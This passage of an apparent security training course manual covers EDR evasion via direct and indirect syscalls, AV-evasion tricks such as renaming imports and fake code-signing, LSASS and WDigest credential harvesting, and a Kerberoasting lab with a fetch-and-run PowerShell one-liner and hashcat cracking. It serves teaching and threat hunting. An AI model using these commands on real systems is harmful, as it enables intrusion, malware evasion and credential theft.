<p>Unfortunately, this method, which was quite effective at first, can be detected by some EDR solutions through kernel callbacks, since the system calls are executed outside of ntdll.dll and the RET command is located directly in the memory area of the program to which the direct syscall is applied. Because normal programs do not behave like this. As you can see, it comes back to what we explained under the heading of normalization and reputation.</p>
<h1><a class="header" href="#b-indirect-syscall" id="b-indirect-syscall">B. Indirect Syscall</a></h1>
<p>Indirect system calls are similar to the direct system calls technique in terms of their working logic. But beyond that, they have a few minor differences in the processing of system calls.</p>
<p>In the direct syscall technique, while the process belonging to ntdll.dll is completely outside the event and the RET commands are in the program itself instead of this DLL, in the case of indirect syscall, since <code>the calls are executed through ntdll.dll</code>, they are perceived as normal by EDR processes. Okay. So, if you ask how EDR cannot perform the hook operation, the logic is actually simple. During the execution of the malicious code, <code>the JMP command goes to the block where the system call is located</code>, instead of pointing to the entry point (starting point) of <code>ntdll.dll</code>. 
Thus, a device unaware of ntdll.dll It is a little more difficult to detect since there is no execution process.</p>
<p><img src="./images/syscall_indirect.jpg" alt="Screenshot" /></p>
<p>Although both techniques still work, the indirect syscall method can help develop less detectable malware. Note that these are methods to avoid user mode hooking. If you are dealing with a security solution that does kernel mode hooking, this techniques can be identified.
In addition, the Event Tracing for Windows (ETW) structure offered by Microsoft for Windows systems can be used by some EDRs to control the stack structures where calls are made. If you want to see a very clean implementation of both techniques, read the article below. We can recommend it.</p>
<p>https://redops.at/en/blog/direct-syscalls-vs-indirect-syscalls
https://github.com/Maldev-Academy/HellHall</p>
<h1><a class="header" href="#chapter-13---evasion" id="chapter-13---evasion">Chapter 1.3 - Evasion</a></h1>
<p>Tips and tricks</p>
<p>strings - HxD/xxd
entropy</p>
<p>IAT &amp; String obfuscation</p>
<h1><a class="header" href="#build-as-release-and-disable-optimization-debug-includes-symbols" id="build-as-release-and-disable-optimization-debug-includes-symbols">Build as release and disable optimization (debug includes symbols)</a></h1>
<h1><a class="header" href="#fake-certs" id="fake-certs">Fake Certs</a></h1>
<p>Add face code-signing certs
https://github.com/jfmaes/LazySign</p>
<h1><a class="header" href="#compilation-meta-data" id="compilation-meta-data">compilation meta data</a></h1>
<h1><a class="header" href="#renaming-functions" id="renaming-functions">Renaming functions</a></h1>
<pre><code class="language-csharp">[DllImport(&quot;kernel32.dll&quot;, EntryPoint =&quot;VirtualAlloc&quot;, SetLastError = false, ExactSpelling = true)]
        private static extern IntPtr VirtualAlloc(
            IntPtr lpStartAddr, 
            UInt32 size, 
            UInt32 flAllocationType, 
            UInt32 flProtect);
</code></pre>
<p>Change to : </p>
<pre><code class="language-csharp">[DllImport(&quot;kernel32.dll&quot;, EntryPoint =&quot;VirtualAlloc&quot;, SetLastError = false, ExactSpelling = true)]
        private static extern IntPtr MemReserve(
            IntPtr lpStartAddr, 
            UInt32 size, 
            UInt32 flAllocationType, 
            UInt32 flProtect);
</code></pre>
<p>Entrypoint -&gt; Specific entrypoint in kernel32.dll basically creating an alias to the function
Add some options to evade AV -&gt; SetLastError, ExactSpelling</p>
<h1><a class="header" href="#base64-encoding" id="base64-encoding">Base64 Encoding</a></h1>
<h1><a class="header" href="#xor-encoding" id="xor-encoding">XOR Encoding</a></h1>
<h1><a class="header" href="#array-reversing" id="array-reversing">Array Reversing</a></h1>
<h1><a class="header" href="#syscalls" id="syscalls">Syscalls</a></h1>
<h1><a class="header" href="#unhooking" id="unhooking">Unhooking</a></h1>
<h1><a class="header" href="#litterbox--avred-forensics" id="litterbox--avred-forensics">Litterbox / Avred (Forensics)</a></h1>
<h1><a class="header" href="#avred-server" id="avred-server">AVRed-Server</a></h1>
<p><em><strong>On windows:</strong></em></p>
<pre><code class="language-powershell">cd c:\git
git clone hhttps://github.com/dobin/avred-server.git
cd avred-server
pip install  -r requirements.txt
</code></pre>
<p>Edit the config.yaml file</p>
<pre><code class="language-yaml">{
	&quot;bind_ip&quot;: &quot;0.0.0.&quot;,
	&quot;port&quot;: 8001,
	&quot;engine&quot;: &quot;Amsi&quot;
}
</code></pre>
<p><img src="./images/avred_server.jpg" alt="image" /></p>
<p>On your windows machine browse to the linke:</p>
<p><img src="./images/avred_server_chrome.jpg" alt="image" /></p>
<p>OPTIONALLY - Install as service with NSSM</p>
<p><a href="https://nssm.cc/ci/nssm-2.24-103-gdee49fc.zip">https://nssm.cc/ci/nssm-2.24-103-gdee49fc.zip</a></p>
<pre><code class="language-powershell">where python.exe
C:\Users\threatadmin\AppData\Local\Programs\Python\Python312\python.exe
C:\Users\threatadmin\AppData\Local\Microsoft\WindowsApps\python.exe
</code></pre>
<pre><code class="language-powershell">nssm install AvredServer&quot;C:\\Users\\threatadmin\\AppData\\Local\\Programs\\Python\\Python312\\python.exe&quot; &quot;C:\\git\\avred-server\\avred_server.py&quot;
nssm set AvredTest AppDirectory &quot;C:\\git\\avred-server\\&quot;
nssm.exe start AvredServer
</code></pre>
<p>Download and install Radare2 on windows and add it to the path</p>
<pre><code class="language-powershell">cd git
git clone https://github.com/dobin/avred.git
pip install -R requirements.txt
</code></pre>
<p>Edit the config.yaml</p>
<pre><code class="language-yaml">server:
  Amsi: &quot;http://10.0.0.8:8001/&quot;
password: &quot;&quot;
hashCache: True
WebMaxFileSizeMb: 50
</code></pre>
<p>run a scan from commandline</p>
<pre><code class="language-powershell">python3 avred.py -f app/upload/meterpreter.exe 
</code></pre>
<p>Run the (GUI) server (this is running on your KALI machine)</p>
<pre><code class="language-bash">python3 avredweb.py
</code></pre>
<p>Browse to the server GUI (from windows or Kali)
http:\10.0.0.7:5000</p>
<p>Install as a service with NSSM</p>
<hr />
<p><em><strong>On Kali</strong></em></p>
<ol>
<li>Install <em>Radare</em></li>
</ol>
<pre><code class="language-bash">sudo apt install radare2
</code></pre>
<ol start="2">
<li>Install <em>AVRed</em></li>
</ol>
<pre><code class="language-bash">cd ~/Desktop
git clone https://github.com/dobin/avred.git
sudo chown -R Threatadmin:Threatadmin avred

</code></pre>
<p>edit the config.yaml and point it to the windows avred_server</p>
<pre><code class="language-bash">cd ~/Desktop/avred
nano config.yaml
</code></pre>
<pre><code class="language-yaml">server:
  Amsi: &quot;http://10.0.0.8:8001/&quot;
password: &quot;&quot;
hashCache: True
WebMaxFileSizeMb: 50
</code></pre>
<p>build AVRed</p>
<pre><code class="language-bash">pip install setuptools
udo apt-get install python3-magic   
pip3 install --upgrade Flask-SQLAlchemy --break-system-ackages
pip3 install --upgrade -r requirements.txt --break-system-packages
</code></pre>
<p>run a scan from commandline</p>
<pre><code class="language-bash">python3 avred.py -f app/upload/meterpreter.exe 
</code></pre>
<p>Run the (GUI) server (this is running on your KALI machine)</p>
<pre><code class="language-bash">python3 avredweb.py
</code></pre>
<p>Browse to the server GUI (from windows or Kali)
http:\10.0.0.7:5000</p>
<h1><a class="header" href="#chapter-2---credential-attacks" id="chapter-2---credential-attacks">Chapter 2 - Credential Attacks</a></h1>
<ol>
<li>Harvesting Credentials from Memory</li>
<li>Kerberoasting</li>
<li>PassWord Spraying</li>
<li>NTLM Relaying</li>
</ol>
<h1><a class="header" href="#chapter-00---lsass-dumping" id="chapter-00---lsass-dumping">Chapter 0.0 - LSASS Dumping</a></h1>
<p>One of the most common techniques used by adversaries is LSASS dumping, blahblah</p>
<p>Local Security Authority (LSA) is protected subsystem that authenticates and logs users onto the local system. In previous versions of Windows (before Windows 10 and Server 2016), LSA stored secrets used by the operating system in its process memory. As discussed above, when hackers compromise operating system, they can get access to process memory leading to credential theft and lateral theft.</p>
<h2><a class="header" href="#mitre-t1003001---os-credential-dumping-lsass-memory" id="mitre-t1003001---os-credential-dumping-lsass-memory">Mitre: T1003.001 - &quot;OS Credential Dumping: LSASS Memory&quot;</a></h2>
<ul>
<li>source: <em><strong><a href="https://attack.mitre.org/techniques/T1003/">https://attack.mitre.org/techniques/T1003/</a></strong></em></li>
</ul>
<blockquote>
<p>Credential dumping is the process of obtaining account login and password information, normally in the form of a hash or a clear text password, from the operating system and software. Credentials can then be used to perform Lateral Movement and access restricted information.</p>
</blockquote>
<p><img src="./images/mitre_text_lsass.jpg" alt="image" /></p>
<p><img src="./images/mitrelsass.jpg" alt="image" /></p>
<h1><a class="header" href="#credentialguard" id="credentialguard">CredentialGuard</a></h1>
<p>Credential guard uses virtualization-based security and creates a new component LSA Isolated to store all secrets that the operating system cannot access directly so that even if hackers compromise the system, they cannot do credential theft. Once Credential guard is configured,  LSA process (LSASS) runs in the operating system, and additional instance of LSA (LSAIso – which stands for LSA Isolated) is created. LSA connects to LSA Isolated using RPC. This is to allow all of the standard calls to LSA to still succeed, offering backwards compatibility for services or applications that require direct communication with LSA.</p>
<p><img src="./images/credguard.jpg" alt="Screenshot" /></p>
<h1><a class="header" href="#credentialguard---things-to-know" id="credentialguard---things-to-know">CredentialGuard - things to know</a></h1>
<p>Credential Guard requirement</p>
<p>Operating System – Windows 10 Enterprise, Windows 10 Education, Windows Server 2016, and Windows 10 IoT Enterprise.</p>
<p>Credential Guard is supported for Hyper-V virtual machine.</p>
<p>Enabling Credential Guard on <code>domain controllers</code> is <em><strong>not supported</strong></em>.</p>
<h1><a class="header" href="#mimikatzsharpkatz" id="mimikatzsharpkatz">Mimikatz/SharpKatz</a></h1>
<p>Most heavily signatured binary in the world.</p>
<p>https://github.com/gentilkiwi/</p>
<p><img src="./images/mimigit.jpg" alt="Screenshot" /></p>
<blockquote>
<p><strong>LSASS</strong> [Memory] : The Local Security Authority Subsystem Service (LSASS) handles the enforcement of security policy in a Windows host. In Windows environments from 2000 to Server 2008 the memory of the LSASS process was storing passwords in clear-text to support WDigest and SSP authentication. </p>
</blockquote>
<p>Credentials are stored in LSASS when:</p>
<ol>
<li>a user logs on locally to the system</li>
<li>you use runas and provide credentials</li>
<li>an RDP connection is established</li>
</ol>
<p>Microsoft from Windows 8.1 and Windows Server 2012 enhanced security by <strong>preventing LSASS from storing passwords in clear-text</strong>. However in a system that has been already compromised with elevated credentials a minor registry modification can instruct LSASS process to store clear-text passwords in its memory in the next login of the user</p>
<p><img src="./images/reg_wdigest.jpg" alt="WDIGEST" /></p>
<pre><code class="language-code">reg add &quot;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest&quot; /v UseLogonCredential /t REG_DWORD /d 00000001 /f
</code></pre>
<blockquote>
<p>Don't forget to log out and in again.</p>
</blockquote>
<p><img src="./images/reg_wdigest_clear.jpg" alt="WDIGEST" /> </p>
<p>If you now run Mimikatz.exe, you'll see clear-text credentials in memory again. Even on Windows 10 - maybe that's a registry key we want to keep an eye on with Sysmon ;-) ?</p>
<p><img src="./images/mimi_clear.jpg" alt="WDIGEST" /> </p>
<p><em><strong>SHARPKATZ</strong></em></p>
<p>.net implementation of Mimikatz.</p>
<p><img src="./images/sharpkatzgit.jpg" alt="Screenshot" /></p>
<p>strings
lazysign
yara
threatcheck (clamav/MS Defender) folder exceptions (AMSI?)
KleenScan
IAT (pebear?)
DNSpy netpeek</p>
<p>Hexview/Visual Studio</p>
<p>NativeDump</p>
<h1><a class="header" href="#chapter-21---memory" id="chapter-21---memory">Chapter 2.1 - Memory</a></h1>
<h1><a class="header" href="#chapter-22---kerberoasting" id="chapter-22---kerberoasting">Chapter 2.2 - Kerberoasting</a></h1>
<blockquote>
<p><strong>So why is Kerberoasting so interesting :</strong></p>
<ul>
<li>can be performed from any <em><strong>domain joined machine</strong></em>.</li>
<li>user needs no special privileges to request a service ticket - <em><strong>ANY</strong></em> authenticated user can do this.</li>
<li>The target system doesn't even need to be available or even exist anymore, if the SPN (service account that exists is enough).</li>
<li>Very hard to spot as this blends in with other service ticket requests.</li>
<li>Cracking the ticket happens <em><strong>off-line</strong></em>.</li>
</ul>
</blockquote>
<p><strong>Here's the gist of it:</strong></p>
<p>Part of a TGS requested for any SPN, is encrypted with the <strong>NTLM hash of that service account’s plaintext password</strong>, any user can request these TGS tickets and then crack hash of the service account offline, without the risk of account lockout!</p>
<h1><a class="header" href="#high-level-overview-of-kerberos" id="high-level-overview-of-kerberos">HIGH LEVEL OVERVIEW OF KERBEROS</a></h1>
<hr />
<p><img src="./images/00_kerberos1.jpg" alt="image" /></p>
<div style="text-align: right"><font size="2">Image by SpecterOps (Will Shroeder)</font></div>
<hr />
<p><img src="./images/00_kerberos2.jpg" alt="image" /></p>
<div style="text-align: right"><font size="2">Image by SpecterOps (Will Shroeder)</font></div>
<hr />
<blockquote>
<p><strong>Kerberoasting mitigations:</strong> The best way to prevent adversaries from cracking kerberos tickets is by using very long and complex passwords. Service Accounts should have a minimum of <strong>25 characters</strong>, make sure to frequently <strong>rotate</strong> the passwords and adhere to the <strong>least privilege</strong> principle when assigning rights to the account (i.e. Don't add the account to Domain Admins just because it's easy). You can also consider using Group Managed Service Accounts (<strong>GSMA</strong>) or another third-party product such as a password vault.</p>
</blockquote>
<p>The table below shows you the average time it would take to brute-force a password, keep in mind these numbers only reflect hard brute forcing, so not using password dictionaries or rainbox tables.</p>
<hr />
<p><img src="./images/kerberoast_01.jpg" alt="Screenshot" /></p>
<hr />
<p>A Few useful <strong>CLI</strong> commands:</p>
<table><thead><tr><th>command</th><th>Details</th></tr></thead><tbody>
<tr><td><strong>net user SVC_SQL /domain</strong></td><td><em>Query DC for user details.</em></td></tr>
<tr><td><strong>net user SVC_SQL Password123!</strong></td><td><em>Set the password of a domain user to Password123.</em></td></tr>
<tr><td><strong>net user /add /domain /active:yes SVC_SQL Password123!</strong></td><td><em>Add a user to the domain, enable the account and set the password.</em></td></tr>
<tr><td><strong>net user SVC_SQL /domain /active:no</strong></td><td><em>Disable (or enable) a domain account</em></td></tr>
<tr><td><strong>net group &quot;domain admins&quot; SVC_SQL /ADD /DOMAIN</strong></td><td><em>Add account to &quot;Domain Admins&quot; (or any other group).</em></td></tr>
<tr><td><strong>setspn -T acme -Q */*</strong></td><td><em>Enumerate all Service Principal Names (SPN), to find service accounts.</em></td></tr>
<tr><td><strong>setspn -A SVC_SQL/dc.acme.local:12345 acme\SVC_sql</strong></td><td><em>Create an SPN for an account.</em></td></tr>
</tbody></table>
<hr />
<p>And the same in <strong>POWERSHELL</strong>:</p>
<table><thead><tr><th>command</th><th>Details</th></tr></thead><tbody>
<tr><td><strong>$secpasswd = ConvertTo-SecureString -String &quot;Password123&quot; -AsPlainText -Force</strong></td><td><em>Put the password in a variable.</em></td></tr>
<tr><td><strong>New-ADuser -Name 'SVC_SQL' -GivenName 'SVC' -Surname 'SQL' -DisplayName 'SVC_SQL' -AccountPassword $secpasswd -enabled 1</strong></td><td><em>Add a user to the domain, enable the account and set the password.</em></td></tr>
</tbody></table>
<hr />
<p>So now let's set up our lab environment by creating a kerberoastable account that has a weak password.</p>
<p>First of all open a new command prompt and let's make sure we have domain admin privileges, needed for creating an account in the domain. The <em><strong>password</strong></em> for DA_student = student.</p>
<pre><code class="language-yaml">runas /user:DA_student@acme.local cmd.exe
</code></pre>
<p>Now we are running a command prompt under DA_student account.</p>
<pre><code class="language-yaml">net user /add /domain /active:yes SVC_SQL Password123!
</code></pre>
<p>This will create a new user, activates the account and sets the password to &quot;Password123!&quot;.</p>
<pre><code class="language-yaml">setspn -A SVC_SQL/dc.acme.local:12345 acme\SVC_sql
</code></pre>
<p>The setspn -A command will set up the SPN for the service account, in this case for a service on the domain controller (dc.acme.local) on port 12345.</p>
<p>Let's check if the SPN was correctly registered:</p>
<pre><code class="language-yaml">setspn -T acme -Q */*
</code></pre>
<p><img src="./images/02_getspnexe.jpg" alt="image" /></p>
<h1><a class="header" href="#kerberoasting-in-action" id="kerberoasting-in-action">KERBEROASTING IN ACTION</a></h1>
<hr />
<ul>
<li>source: <em><strong><a href="https://github.com/nidem/kerberoast/blob/master/GetUserSPNs.ps1">GetUserSPNs.ps1</a></strong></em> - link</li>
</ul>
<p>Let's see which <strong>SPN</strong>'s exist and to which groups they belong, let try to get some parent process activity going. Open a <strong>command</strong> prompt:</p>
<pre><code class="language-yaml">powershell.exe -NoP -NonI -Exec Bypass -command &quot;c:\labs\4_KERBEROAST\GetUserSPNs.ps1&quot;
</code></pre>
<p><img src="./images/02_getspns_pwsh.jpg" alt="image" /></p>
<p>Now let's request a ticket for those SPN's, by running the one-liner below you're again doing the attack in a file-less manner by downloading the Invoke-Kerberoast powershell script directly into the memory of <code>powershell.exe</code>:</p>
<ul>
<li>source: <em><strong><a href="https://github.com/BC-SECURITY/Empire/blob/master/data/module_source/credentials/Invoke-Kerberoast.ps1">Invoke-Kerberoast.ps1</a></strong></em> - link</li>
</ul>
<p>Open a <strong>powershell</strong> prompt (as Administrator):</p>
<pre><code class="language-yaml">IEX(New-Object Net.WebClient).DownloadString(&quot;https://raw.githubusercontent.com/crimsoncore/threathunt_student/master/labs/4_KERBEROAST/Invoke-Kerberoast.ps1&quot;);Invoke-Kerberoast
</code></pre>
<p><img src="./images/02_Invoke_Kerb_pwsh.jpg" alt="image" /></p>
<p>Let's run it locally and save the hashes, this will avoid copy/paste errors, open a <strong>powershell</strong> prompt:</p>
<pre><code class="language-yaml">IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/crimsoncore/threathunt_student/master/labs/4_KERBEROAST/Invoke-Kerberoast.ps1');
</code></pre>
<pre><code class="language-yaml">Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
</code></pre>
<p><img src="./images/02_IEX_KERB.jpg" alt="image" /></p>
<p>So by default this will <em><strong>enumerate amd rquest tickets for ALL SPN's</strong></em> on a domain, this of course is suspicious as a user would never to request all those tickets at the same time. A more stealthy adversary will first do his recon (GetUserSPN's for example) and see which service accounts might prove juicy targets, and then just request a <strong>single SPN</strong>:</p>
<p>In the SAME <strong>powershell</strong> prompt:</p>
<pre><code class="language-code">invoke-kerberoast -Identity SVC_sql
</code></pre>
<blockquote>
<p>Invoke-Kerberoast's default output is for <strong>John</strong> (the password cracker installed by default on Kali), you need to change the output format to <strong>HashCat</strong> in order to crack the hashes with hashcat.</p>
</blockquote>
<p>On your <code>Windows 10 machine</code> use WinSCP to transfer <em><strong>hashes.kerberoast</strong></em> to your Ubuntu machine under the path <em><strong>&quot;/opt/kerberos/&quot;</strong></em> :</p>
<p>Or you can use SCP to copy the file over:</p>
<pre><code class="language-yaml">scp Top1000.txt root@192.168.18.204:/opt/kerberos/Top1000.txt
</code></pre>
<blockquote>
<p><strong>IMPORTANT</strong>: If you want to run this attack multiple times, don't forget to purge your Kerberos tickets. Kerberos Tickets are cached for SSO purposes, so if you run the Invoke-Kerberoast script multplie times, your client will not request a new TGS from the DC when it still has one in it's cach.</p>
<p>You can view and clear the cache with these commands:</p>
</blockquote>
<pre><code class="language-yaml">klist
</code></pre>
<pre><code class="language-yaml">klist purge
</code></pre>
<p><img src="./images/00_klistpwsh.jpg" alt="image" /></p>
<p><img src="./images/00_klist_purge.jpg" alt="image" /></p>
<h1><a class="header" href="#cracking-hashes-using-hashcat" id="cracking-hashes-using-hashcat">CRACKING HASHES USING HASHCAT</a></h1>
<hr />
<p>On your <code>Ubuntu Machine</code> we're going to use hashcat to crack the hashes</p>
<p>First let's install hashcat</p>
<pre><code class="language-yaml">sudo apt update
apt install hashcat
</code></pre>
<pre><code class="language-yaml">cd /opt/kerberos
hashcat -m 13100 --force -a 0 hashes.kerberoast passwords.txt --potfile-disable -o cracked.txt
</code></pre>
<p>To clear the cache:</p>
<pre><code class="language-yaml">hashcat --remove hashes.kerberoast
</code></pre>
<p>To clear the potfile</p>
<pre><code class="language-yaml">sudo rm ~/.hashcat/hashcat.potfile
</code></pre>
<h1><a class="header" href="#chapter-23---spraying" id="chapter-23---spraying">Chapter 2.3 - Spraying</a></h1>
<h1><a class="header" href="#chapter-24---relaying" id="chapter-24---relaying">Chapter 2.4 - Relaying</a></h1>
<h1><a class="header" href="#chapter-25---golden-ticket" id="chapter-25---golden-ticket">Chapter 2.5 - Golden Ticket</a></h1>
<h1><a class="header" href="#chapter-26---dc-sync" id="chapter-26---dc-sync">Chapter 2.6 - DC Sync</a></h1>
<h1><a class="header" href="#chapter-27---pass-the-hash" id="chapter-27---pass-the-hash">Chapter 2.7 - Pass the Hash</a></h1>
<h1><a class="header" href="#chapter-28---evil-winrm" id="chapter-28---evil-winrm">Chapter 2.8 - Evil-WinRM</a></h1>
<p>Windows Remote Management (WinRM) is highlighted as a protocol by Microsoft that enables the remote management of Windows systems through HTTP(S), leveraging SOAP in the process. It's fundamentally powered by WMI, presenting itself as an HTTP-based interface for WMI operations.</p>
<p>The presence of WinRM on a machine allows for straightforward remote administration via PowerShell, akin to how SSH works for other operating systems. To determine if WinRM is operational, checking for the opening of specific ports is recommended:</p>
<p><strong>5985/tcp</strong> (HTTP) and <strong>5986/tcp</strong> (HTTPS)</p>
<h1><a class="header" href="#initiating-a-winrm-session" id="initiating-a-winrm-session">Initiating a WinRM Session</a></h1>
<p>To configure PowerShell for WinRM, Microsoft's Enable-PSRemoting cmdlet comes into play, setting up the computer to accept remote PowerShell commands. With elevated PowerShell access, the following commands can be executed to enable this functionality and designate any host as trusted:</p>
<pre><code>Enable-PSRemoting -Force  1

Set-Item wsman:\localhost\client\trustedhosts *  
</code></pre>
<p>This approach involves adding a wildcard to the trustedhosts configuration, a step that requires cautious consideration due to its implications. It's also noted that altering the network type from &quot;Public&quot; to &quot;Work&quot; might be necessary on the attacker's machine.</p>
<p>Moreover, WinRM can be activated remotely using the wmic command, demonstrated as follows:</p>
<pre><code>wmic /node:&lt;REMOTE_HOST&gt; process call create &quot;powershell enable-psremoting -force&quot;
</code></pre>
<p>This method allows for the remote setup of WinRM, enhancing the flexibility in managing Windows machines from afar.</p>
<h1><a class="header" href="#test-if-configured" id="test-if-configured">Test if configured</a></h1>
<p>To verify the setup of your attack machine, the Test-WSMan command is utilized to check if the target has WinRM configured properly. By executing this command, you should expect to receive details concerning the protocol version and wsmid, indicating successful configuration. Below are examples demonstrating the expected output for a configured target versus an unconfigured one:</p>
<p>For a target that is properly configured, the output will look similar to this:</p>
<pre><code>Test-WSMan &lt;target-ip&gt;
</code></pre>
<p>The response should contain information about the protocol version and wsmid, signifying that WinRM is set up correctly.</p>
<p><img src="./images/2_8_1_testwsman.jpg" alt="Screenshot" /></p>
<p>From your Kali Linux you can simply use NMAP:</p>
<pre><code class="language-code">nmap -p 5985,5986 10.0.0.5 
</code></pre>
<p>https://book.hacktricks.xyz/network-services-pentesting/5985-5986-pentesting-winrm</p>
<pre><code class="language-python">[book]
title = &quot;My Awesome Book&quot;

[output.wordcount]

[output.html]
</code></pre>
<style>
r { color: Red }
o { color: Orange }
g { color: Green }
</style>
<h1><a class="header" href="#todos" id="todos">TODOs:</a></h1>
<ul>
<li><r>TODO:</r> Important thing to do</li>
<li><o>TODO:</o> Less important thing to do</li>
<li><g>DONE:</g> Breath deeply and improve karma</li>
</ul>
<h1><a class="header" href="#chat" id="chat">CHAT</a></h1>
<p>Please insrall <a href="https://discord.com"><strong>DISCORD</strong></a> on your machine - we'll be using discord for sharing links, documents, chatting, questions and banter. At the beginning of the class you'll receive an invite to join the Threat Hunting Academy channel.</p>
<h1><a class="header" href="#access-to-the-lab" id="access-to-the-lab">ACCESS to the lab:</a></h1>
<p>Students get access to a central <code>GUACAMOLE</code> server, from there they can <code>RDP</code> into their Windows 10 machine and use SSH (native ssh in WIN10 or putty) to their Kali machine.</p>
<p>The guacamole server is : <a href="https://guacamole.th.denarm.be/#/"><strong>GUACAMOLE</strong></a><br />
Credentials are : <strong>studentXX</strong>/WEWILLTELLYOU (where XX is a number from 01 to 15)<br />
RDP credentials are : <strong>studentXX</strong>/WEWILLTELLYOU (where XX is a number from 01 to 15)</p>
<pre><code class="language-code">https://guacamole.th.denarm.be/
</code></pre>

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                        

                        

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                

                
            </nav>

        </div>

        
        <!-- Livereload script (if served using the cli tool) -->
        <script type="text/javascript">
            var socket = new WebSocket("ws://localhost:3001");
            socket.onmessage = function (event) {
                if (event.data === "reload") {
                    socket.close();
                    location.reload(true); // force reload from server (not from cache)
                }
            };

            window.onbeforeunload = function() {
                socket.close();
            }
        </script>
        

        

        
        
        
        <script type="text/javascript">
            window.playpen_copyable = true;
        </script>
        

        

        
        <script src="elasticlunr.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="mark.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="searcher.js" type="text/javascript" charset="utf-8"></script>
        

        <script src="clipboard.min.js" type="text/javascript" charset="utf-8"></script>
        <script src="highlight.js" type="text/javascript" charset="utf-8"></script>
        <script src="book.js" type="text/javascript" charset="utf-8"></script>

        <!-- Custom JS scripts -->
        

        
        
        <script type="text/javascript">
        window.addEventListener('load', function() {
            window.setTimeout(window.print, 100);
        });
        </script>
        
        

    </body>
</html>
